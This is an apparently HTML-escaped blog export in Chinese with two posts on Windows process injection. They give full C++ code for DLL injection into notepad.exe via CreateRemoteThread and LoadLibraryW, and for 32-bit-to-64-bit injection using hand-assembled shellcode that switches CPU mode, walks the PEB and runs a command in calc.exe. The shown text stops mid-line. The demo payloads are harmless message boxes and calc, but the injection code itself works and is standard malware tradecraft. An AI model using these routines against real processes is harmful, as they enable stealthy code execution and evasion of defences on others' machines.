123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;tlhelp32.h&gt;using namespace std;DWORD GetPidByName(LPCWSTR lpName)&#123; DWORD pid = 0; HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (!hSnap) &#123; cout &lt;&lt; &quot;Create Process Snap failed&quot; &lt;&lt; endl; return 0; &#125; PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); Process32First(hSnap, &amp;pe); do &#123; if (!_wcsicmp(lpName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; while (Process32Next(hSnap, &amp;pe)); return pid;&#125;bool EnableDebugPrivilege()&#123; bool bRet = false; HANDLE token; TOKEN_PRIVILEGES tp; // 打开进程令牌环 if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;token)) &#123; cout &lt;&lt; &quot;Open Toekn Failed&quot; &lt;&lt; endl; return bRet; &#125; // 获取进程uuid LUID luid; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid)) &#123; cout &lt;&lt; &quot;Get uid failed&quot; &lt;&lt; endl; return bRet; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tp.Privileges[0].Luid = luid; // 调整进程权限 if (!AdjustTokenPrivileges(token, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; cout &lt;&lt; &quot;Adjust Privilege failed&quot; &lt;&lt; endl; return bRet; &#125; bRet = true; return bRet;&#125;int main(char* argc, const char* argv[])&#123; // 先提权 if (!EnableDebugPrivilege()) &#123; cout &lt;&lt; &quot;提权失败&quot; &lt;&lt; endl; return 0; &#125; DWORD dwTargetPid = GetPidByName(L&quot;notepad.exe&quot;); if (!dwTargetPid) &#123; cout &lt;&lt; &quot;Get Target Process Id failed&quot; &lt;&lt; endl; return 0; &#125; // 打开目标进程 HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, dwTargetPid); if (!hTarget) &#123; cout &lt;&lt; &quot;Open Target Process failed&quot; &lt;&lt; endl; return 0; &#125; // 在目标进程申请内存 void* pLoadLibFuncParam = nullptr; pLoadLibFuncParam = VirtualAllocEx(hTarget, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pLoadLibFuncParam == nullptr) &#123; cout &lt;&lt; &quot;alloc memery failed&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; LPCTSTR lpParam = L&quot;C:\\\\6\\\\SimpleDll.dll&quot;; if (!WriteProcessMemory(hTarget, pLoadLibFuncParam, (LPCVOID)lpParam, (wcslen(lpParam) + 1) * sizeof(TCHAR), NULL)) &#123; cout &lt;&lt; &quot;写入内存失败&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; HMODULE hNtdll = LoadLibrary(L&quot;kernel32.dll&quot;); if (!hNtdll) &#123; cout &lt;&lt; &quot;加载模块错误&quot; &lt;&lt; GetLastError() &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;模块句柄: &quot; &lt;&lt; hNtdll &lt;&lt; endl; void* pLoadLibrary = nullptr; pLoadLibrary = GetProcAddress(hNtdll, &quot;LoadLibraryW&quot;); if (pLoadLibrary == nullptr) &#123; cout &lt;&lt; &quot;找不到函数&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;函数地址: &quot; &lt;&lt; pLoadLibrary &lt;&lt; endl; DWORD dwThreadId = 0; HANDLE hRemoteThread = CreateRemoteThread(hTarget, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, (LPVOID)pLoadLibFuncParam, 0, &amp;dwThreadId); if (!hRemoteThread) &#123; cout &lt;&lt; &quot;创建进程失败&quot; &lt;&lt; GetLastError() &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;运行结束&quot; &lt;&lt; hRemoteThread &lt;&lt; endl; getchar(); getchar(); CloseHandle(hTarget); return 0;&#125; simpledll.dllsimple 只需要简单写一个对话框展示即可： 12345678910111213141516171819202122232425// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;DWORD WINAPI ThreadProc()&#123; MessageBox(NULL, L&quot;我已成功打入敌人内部 By Startu&quot;, L&quot;报告首长&quot;, 0); return 0;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, 0, NULL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 补充说明需要注意 注入的dll要和notepad.exe 编译版本保持一致。notepad.exe 是一个 64bit 进程 0x04、演示 工程文件：Windows-API-Usage&#x2F;kernel32&#x2F;DLLInject&#x2F;DllInject at master · holdyounger&#x2F;Windows-API-Usage","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Hook】32位程序对64位程序远程注入的实现","date":"2024-01-23T06:08:33.905Z","path":"A_OS/Windows/【IH】32位程序对64位程序的注入/","text":"概述：【学习记录】实现 32 位程序对 64位程序的注入，借鉴 3gstudent 和 odzhan 的实现。 环境说明： windows x64 被注入程序 x86 dll 0x01、前言通常要实现远程注入都需要调用 CreateRemoteThread 函数在目标进程中创建一个远程线程，进而注入dll或是执行shellcode。如下所示为注入一个简单的dll到notepad中。 注入的常规流程为： 本地提权 获取目标进程的pid 打开目标进程 在目标进程申请内存并写入内存 通过公共函数调用创建远程线程 参考代码见文章 dll 注入 但是，在64位操作系统上，由于32位和64位的结构不同，所以会导致注入失败。 0x02、实现思路主要思路为：将 CreateRemoteThread 切换为64位的 CreateRemoteThread 后再创建线程，完成后再切换回32位，即可实现32位程序对64位进程的远程注入。切换的操作主要是汇编代码实现的。记录一下。 1 获取64位 CreateRemoteThread 函数地址获取64位 CreateRemoteThread 主要由汇编代码实现。 参考博客：DLL&#x2F;PIC Injection on Windows from Wow64 process | modexp 相关代码 shellcode&#x2F;os&#x2F;win&#x2F;pi at master · odzhan&#x2F;shellcode 2 注入线程并调用参考代码： CreateRemoteThread简单应用-CSDN博客 主要逻辑为： 获取目标进程PID 需要判断系统操作数 需要判断目标进程的操作数 申请内存 获取 CreateRemoteThread 函数的地址 创建远程线程 3 判断系统操作数12345678910111213141516171819202122232425#include &lt;windows.h&gt;BOOL Is64BitOS()&#123; typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo ); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;GetNativeSystemInfo&quot;); if(fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123;0&#125;; fnGetNativeSystemInfo( &amp;stInfo); if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125;int main()&#123; if (Is64BitOS()) printf(&quot;x64\\n&quot;); else printf(&quot;x86\\n&quot;); return 0;&#125; 4 判断目标进程是不是 64 位1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;windows.h&gt;#include &lt;TlHelp32.h&gt; BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125;DWORD processNameToId(LPCTSTR lpszProcessName) &#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0; &#125; int main()&#123; BOOL bWow64; char *szExeName=&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; bWow64 = IsWow64(hTargetProcess); if(bWow64) printf(&quot;32-bit process\\n&quot;); else printf(&quot;64-bit process\\n&quot;);&#125; 0x03、完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;TlHelp32.h&gt; #define CREATETHREADPIC_SIZE 271char CREATETHREADPIC[] = &#123; /* 0000 */ &quot;\\x53&quot; /* push rbx */ /* 0001 */ &quot;\\x56&quot; /* push rsi */ /* 0002 */ &quot;\\x57&quot; /* push rdi */ /* 0003 */ &quot;\\x55&quot; /* push rbp */ /* 0004 */ &quot;\\xe8\\x6c\\x00\\x00\\x00&quot; /* call 0x75 */ /* 0009 */ &quot;\\x85\\xc0&quot; /* test eax, eax */ /* 000B */ &quot;\\x74\\x5d&quot; /* jz 0x6a */ /* 000D */ &quot;\\x48\\x89\\xe6&quot; /* mov rsi, rsp */ /* 0010 */ &quot;\\x48\\x83\\xe4\\xf0&quot; /* and rsp, 0xfffffffffffffff0 */ /* 0014 */ &quot;\\x48\\x83\\xec\\x68&quot; /* sub rsp, 0x68 */ /* 0018 */ &quot;\\xb8\\xfa\\x80\\x39\\x5e&quot; /* mov eax, 0x5e3980fa */ /* 001D */ &quot;\\xe8\\x78\\x00\\x00\\x00&quot; /* call 0x9a */ /* 0022 */ &quot;\\x48\\x89\\xc3&quot; /* mov rbx, rax */ /* 0025 */ &quot;\\x4d\\x31\\xc0&quot; /* xor r8, r8 */ /* 0028 */ &quot;\\x48\\x31\\xc0&quot; /* xor rax, rax */ /* 002B */ &quot;\\x48\\x89\\x44\\x24\\x50&quot; /* mov [rsp+0x50], rax */ /* 0030 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot; /* mov [rsp+0x48], rax */ /* 0035 */ &quot;\\x48\\x89\\x44\\x24\\x40&quot; /* mov [rsp+0x40], rax */ /* 003A */ &quot;\\x48\\x89\\x44\\x24\\x38&quot; /* mov [rsp+0x38], rax */ /* 003F */ &quot;\\x48\\x89\\x44\\x24\\x30&quot; /* mov [rsp+0x30], rax */ /* 0044 */ &quot;\\x8b\\x46\\x24&quot; /* mov eax, [rsi+0x24] */ /* 0047 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot; /* mov [rsp+0x28], rax */ /* 004C */ &quot;\\x8b\\x46\\x20&quot; /* mov eax, [rsi+0x20] */ /* 004F */ &quot;\\x48\\x89\\x44\\x24\\x20&quot; /* mov [rsp+0x20], rax */ /* 0054 */ &quot;\\x44\\x8b\\x4e\\x14&quot; /* mov r9d, [rsi+0x14] */ /* 0058 */ &quot;\\xba\\x00\\x00\\x00\\x10&quot; /* mov edx, 0x10000000 */ /* 005D */ &quot;\\x8b\\x4e\\x30&quot; /* mov ecx, [rsi+0x30] */ /* 0060 */ &quot;\\xff\\xd3&quot; /* call rbx */ /* 0062 */ &quot;\\x48\\x89\\xf4&quot; /* mov rsp, rsi */ /* 0065 */ &quot;\\xe8\\x18\\x00\\x00\\x00&quot; /* call 0x82 */ /* 006A */ &quot;\\x5d&quot; /* pop rbp */ /* 006B */ &quot;\\x5f&quot; /* pop rdi */ /* 006C */ &quot;\\x5e&quot; /* pop rsi */ /* 006D */ &quot;\\x5b&quot; /* pop rbx */ /* 006E */ &quot;\\xc3&quot; /* ret */ /* 006F */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 0071 */ &quot;\\x48\\xf7\\xd8&quot; /* neg rax */ /* 0074 */ &quot;\\xc3&quot; /* ret */ /* 0075 */ &quot;\\xe8\\xf5\\xff\\xff\\xff&quot; /* call 0x6f */ /* 007A */ &quot;\\x74\\x05&quot; /* jz 0x81 */ /* 007C */ &quot;\\x58&quot; /* pop rax */ /* 007D */ &quot;\\x6a\\x33&quot; /* push 0x33 */ /* 007F */ &quot;\\x50&quot; /* push rax */ /* 0080 */ &quot;\\xcb&quot; /* retf */ /* 0081 */ &quot;\\xc3&quot; /* ret */ /* 0082 */ &quot;\\xe8\\xe8\\xff\\xff\\xff&quot; /* call 0x6f */ /* 0087 */ &quot;\\x75\\x10&quot; /* jnz 0x99 */ /* 0089 */ &quot;\\x58&quot; /* pop rax */ /* 008A */ &quot;\\x83\\xec\\x08&quot; /* sub esp, 0x8 */ /* 008D */ &quot;\\x89\\x04\\x24&quot; /* mov [rsp], eax */ /* 0090 */ &quot;\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00&quot; /* mov dword [rsp+0x4], 0x23 */ /* 0098 */ &quot;\\xcb&quot; /* retf */ /* 0099 */ &quot;\\xc3&quot; /* ret */ /* 009A */ &quot;\\x56&quot; /* push rsi */ /* 009B */ &quot;\\x57&quot; /* push rdi */ /* 009C */ &quot;\\x53&quot; /* push rbx */ /* 009D */ &quot;\\x51&quot; /* push rcx */ /* 009E */ &quot;\\x49\\x89\\xc0&quot; /* mov r8, rax */ /* 00A1 */ &quot;\\x6a\\x60&quot; /* push 0x60 */ /* 00A3 */ &quot;\\x5e&quot; /* pop rsi */ /* 00A4 */ &quot;\\x65\\x48\\x8b\\x06&quot; /* mov rax, [gs:rsi] */ /* 00A8 */ &quot;\\x48\\x8b\\x40\\x18&quot; /* mov rax, [rax+0x18] */ /* 00AC */ &quot;\\x4c\\x8b\\x50\\x30&quot; /* mov r10, [rax+0x30] */ /* 00B0 */ &quot;\\x49\\x8b\\x6a\\x10&quot; /* mov rbp, [r10+0x10] */ /* 00B4 */ &quot;\\x48\\x85\\xed&quot; /* test rbp, rbp */ /* 00B7 */ &quot;\\x89\\xe8&quot; /* mov eax, ebp */ /* 00B9 */ &quot;\\x74\\x4f&quot; /* jz 0x10a */ /* 00BB */ &quot;\\x4d\\x8b\\x12&quot; /* mov r10, [r10] */ /* 00BE */ &quot;\\x8b\\x45\\x3c&quot; /* mov eax, [rbp+0x3c] */ /* 00C1 */ &quot;\\x83\\xc0\\x10&quot; /* add eax, 0x10 */ /* 00C4 */ &quot;\\x8b\\x44\\x05\\x78&quot; /* mov eax, [rbp+rax+0x78] */ /* 00C8 */ &quot;\\x48\\x8d\\x74\\x05\\x18&quot; /* lea rsi, [rbp+rax+0x18] */ /* 00CD */ &quot;\\xad&quot; /* lodsd */ /* 00CE */ &quot;\\x91&quot; /* xchg ecx, eax */ /* 00CF */ &quot;\\x67\\xe3\\xde&quot; /* jecxz 0xb0 */ /* 00D2 */ &quot;\\xad&quot; /* lodsd */ /* 00D3 */ &quot;\\x4c\\x8d\\x5c\\x05\\x00&quot; /* lea r11, [rbp+rax] */ /* 00D8 */ &quot;\\xad&quot; /* lodsd */ /* 00D9 */ &quot;\\x48\\x8d\\x7c\\x05\\x00&quot; /* lea rdi, [rbp+rax] */ /* 00DE */ &quot;\\xad&quot; /* lodsd */ /* 00DF */ &quot;\\x48\\x8d\\x5c\\x05\\x00&quot; /* lea rbx, [rbp+rax] */ /* 00E4 */ &quot;\\x8b\\x74\\x8f\\xfc&quot; /* mov esi, [rdi+rcx*4-0x4] */ /* 00E8 */ &quot;\\x48\\x01\\xee&quot; /* add rsi, rbp */ /* 00EB */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 00ED */ &quot;\\x99&quot; /* cdq */ /* 00EE */ &quot;\\xac&quot; /* lodsb */ /* 00EF */ &quot;\\x01\\xc2&quot; /* add edx, eax */ /* 00F1 */ &quot;\\xc1\\xc2\\x05&quot; /* rol edx, 0x5 */ /* 00F4 */ &quot;\\xff\\xc8&quot; /* dec eax */ /* 00F6 */ &quot;\\x79\\xf6&quot; /* jns 0xee */ /* 00F8 */ &quot;\\x44\\x39\\xc2&quot; /* cmp edx, r8d */ /* 00FB */ &quot;\\xe0\\xe7&quot; /* loopne 0xe4 */ /* 00FD */ &quot;\\x75\\xb1&quot; /* jnz 0xb0 */ /* 00FF */ &quot;\\x0f\\xb7\\x14\\x4b&quot; /* movzx edx, word [rbx+rcx*2] */ /* 0103 */ &quot;\\x41\\x8b\\x04\\x93&quot; /* mov eax, [r11+rdx*4] */ /* 0107 */ &quot;\\x48\\x01\\xe8&quot; /* add rax, rbp */ /* 010A */ &quot;\\x59&quot; /* pop rcx */ /* 010B */ &quot;\\x5b&quot; /* pop rbx */ /* 010C */ &quot;\\x5f&quot; /* pop rdi */ /* 010D */ &quot;\\x5e&quot; /* pop rsi */ /* 010E */ &quot;\\xc3&quot; /* ret */&#125;;#define EXECPIC_SIZE 123char EXECPIC[] = &#123; /* 0000 */ &quot;\\x53&quot; /* push rbx */ /* 0001 */ &quot;\\x56&quot; /* push rsi */ /* 0002 */ &quot;\\x57&quot; /* push rdi */ /* 0003 */ &quot;\\x55&quot; /* push rbp */ /* 0004 */ &quot;\\x83\\xec\\x28&quot; /* sub esp, 0x28 */ /* 0007 */ &quot;\\x31\\xc0&quot; /* xor eax, eax */ /* 0009 */ &quot;\\x40\\x92&quot; /* xchg edx, eax */ /* 000B */ &quot;\\x74\\x1a&quot; /* jz 0x27 */ /* 000D */ &quot;\\x8b\\x4c\\x24\\x3c&quot; /* mov ecx, [rsp+0x3c] */ /* 0011 */ &quot;\\x50&quot; /* push rax */ /* 0012 */ &quot;\\x51&quot; /* push rcx */ /* 0013 */ &quot;\\x64\\x8b\\x72\\x2f&quot; /* mov esi, [fs:rdx+0x2f] */ /* 0017 */ &quot;\\x8b\\x76\\x0c&quot; /* mov esi, [rsi+0xc] */ /* 001A */ &quot;\\x8b\\x76\\x0c&quot; /* mov esi, [rsi+0xc] */ /* 001D */ &quot;\\xad&quot; /* lodsd */ /* 001E */ &quot;\\x8b\\x30&quot; /* mov esi, [rax] */ /* 0020 */ &quot;\\x8b\\x7e\\x18&quot; /* mov edi, [rsi+0x18] */ /* 0023 */ &quot;\\xb2\\x50&quot; /* mov dl, 0x50 */ /* 0025 */ &quot;\\xeb\\x17&quot; /* jmp 0x3e */ /* 0027 */ &quot;\\xb2\\x60&quot; /* mov dl, 0x60 */ /* 0029 */ &quot;\\x65\\x48\\x8b\\x32&quot; /* mov rsi, [gs:rdx] */ /* 002D */ &quot;\\x48\\x8b\\x76\\x18&quot; /* mov rsi, [rsi+0x18] */ /* 0031 */ &quot;\\x48\\x8b\\x76\\x10&quot; /* mov rsi, [rsi+0x10] */ /* 0035 */ &quot;\\x48\\xad&quot; /* lodsq */ /* 0037 */ &quot;\\x48\\x8b\\x30&quot; /* mov rsi, [rax] */ /* 003A */ &quot;\\x48\\x8b\\x7e\\x30&quot; /* mov rdi, [rsi+0x30] */ /* 003E */ &quot;\\x03\\x57\\x3c&quot; /* add edx, [rdi+0x3c] */ /* 0041 */ &quot;\\x8b\\x5c\\x17\\x28&quot; /* mov ebx, [rdi+rdx+0x28] */ /* 0045 */ &quot;\\x8b\\x74\\x1f\\x20&quot; /* mov esi, [rdi+rbx+0x20] */ /* 0049 */ &quot;\\x48\\x01\\xfe&quot; /* add rsi, rdi */ /* 004C */ &quot;\\x8b\\x54\\x1f\\x24&quot; /* mov edx, [rdi+rbx+0x24] */ /* 0050 */ &quot;\\x0f\\xb7\\x2c\\x17&quot; /* movzx ebp, word [rdi+rdx] */ /* 0054 */ &quot;\\x48\\x8d\\x52\\x02&quot; /* lea rdx, [rdx+0x2] */ /* 0058 */ &quot;\\xad&quot; /* lodsd */ /* 0059 */ &quot;\\x81\\x3c\\x07\\x57\\x69\\x6e\\x45&quot; /* cmp dword [rdi+rax], 0x456e6957 */ /* 0060 */ &quot;\\x75\\xee&quot; /* jnz 0x50 */ /* 0062 */ &quot;\\x8b\\x74\\x1f\\x1c&quot; /* mov esi, [rdi+rbx+0x1c] */ /* 0066 */ &quot;\\x48\\x01\\xfe&quot; /* add rsi, rdi */ /* 0069 */ &quot;\\x8b\\x34\\xae&quot; /* mov esi, [rsi+rbp*4] */ /* 006C */ &quot;\\x48\\x01\\xf7&quot; /* add rdi, rsi */ /* 006F */ &quot;\\x99&quot; /* cdq */ /* 0070 */ &quot;\\xff\\xd7&quot; /* call rdi */ /* 0072 */ &quot;\\x48\\x83\\xc4\\x28&quot; /* add rsp, 0x28 */ /* 0076 */ &quot;\\x5d&quot; /* pop rbp */ /* 0077 */ &quot;\\x5f&quot; /* pop rdi */ /* 0078 */ &quot;\\x5e&quot; /* pop rsi */ /* 0079 */ &quot;\\x5b&quot; /* pop rbx */ /* 007A */ &quot;\\xc3&quot; /* ret */&#125;;typedef VOID(*pCreateRemoteThread64) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);typedef struct _RemoteParam &#123; char szMsg[12]; DWORD dwMessageBox;&#125; RemoteParam, * PRemoteParam;typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;), &quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125;DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125;BOOL Is64BitOS()&#123; typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;), &quot;GetNativeSystemInfo&quot;); if (fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123; 0 &#125;; fnGetNativeSystemInfo(&amp;stInfo); if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125;LPVOID init_func(char* asmcode, DWORD len)&#123; LPVOID sc = NULL; // allocate write/executable memory for code sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (sc != NULL) &#123; // copy code memcpy(sc, asmcode, len); &#125; else &#123; MessageBox(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; return sc;&#125;DWORD __stdcall threadProc(LPVOID lParam)&#123; RemoteParam* pRP = (RemoteParam*)lParam; PFN_MESSAGEBOX pfnMessageBox; pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox; pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0); return 0;&#125;bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125;void free_func(LPVOID func) &#123; if (func != NULL) &#123; VirtualFree(func, 0, MEM_RELEASE); &#125;&#125;int main()&#123; BOOL bWow64; char* szExeName = (char*)&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; bWow64 = IsWow64(hTargetProcess); if (bWow64 || !Is64BitOS()) &#123; printf(&quot;32-bit process\\n&quot;); const DWORD dwThreadSize = 4096; DWORD dwWriteBytes; enableDebugPriv(); void* pRemoteThread = VirtualAllocEx(hTargetProcess, 0, dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!pRemoteThread) &#123; MessageBox(NULL, &quot;Alloc memory in target process failed !&quot;, &quot;notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; if (!WriteProcessMemory(hTargetProcess, pRemoteThread, &amp;threadProc, dwThreadSize, 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; RemoteParam remoteData; ZeroMemory(&amp;remoteData, sizeof(RemoteParam)); HINSTANCE hUser32 = LoadLibrary(&quot;User32.dll&quot;); remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;); strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;); RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx( hTargetProcess, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE); if (!pRemoteParam) &#123; MessageBox(NULL, &quot;Alloc memory failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; if (!WriteProcessMemory(hTargetProcess, pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) &#123; MessageBox(NULL, &quot;Write data to target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; HANDLE hRemoteThread = CreateRemoteThread( hTargetProcess, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread, pRemoteParam, 0, &amp;dwWriteBytes); if (!hRemoteThread) &#123; MessageBox(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; CloseHandle(hRemoteThread); FreeLibrary(hUser32); &#125; else &#123; printf(&quot;64-bit process\\n&quot;); char* cmd = (char*)&quot;cmd /c start calc.exe&quot;; int CmdSize = strlen(cmd); HANDLE hProc, hThread; BOOL bStatus = FALSE; LPVOID pCode = NULL, pData = NULL; SIZE_T written; DWORD idx, ec; pCreateRemoteThread64 CreateRemoteThread64 = NULL; // try open the process printf(&quot; [ opening process id %lu\\n&quot;, dwProcessId); hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProc != NULL) &#123; // allocate memory there printf(&quot; [ allocating %lu bytes of XRW memory in process for code\\n&quot;, EXECPIC_SIZE); pCode = VirtualAllocEx(hProc, 0, EXECPIC_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (pCode != NULL) &#123; // write the code printf(&quot; [ writing %lu bytes of code to 